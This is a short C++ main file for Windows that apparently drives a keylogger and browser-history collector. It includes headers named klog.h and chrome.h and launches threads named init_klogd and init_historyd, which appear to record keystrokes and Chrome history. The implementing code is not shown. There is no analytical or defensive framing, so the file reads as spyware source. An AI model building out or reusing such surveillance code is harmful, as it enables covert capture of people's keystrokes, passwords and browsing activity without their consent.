#include <Windows.h>
#include <chrono>
#include <ctime>
#include <thread>

#include "write.h"
#include "chrome.h"
#include "klog.h"
// #include "capt.h"

int main(){

    std::thread klogd(init_klogd);
    std::thread historyd(init_historyd);
    
    historyd.join();
    klogd.join();
    

    return 0;
}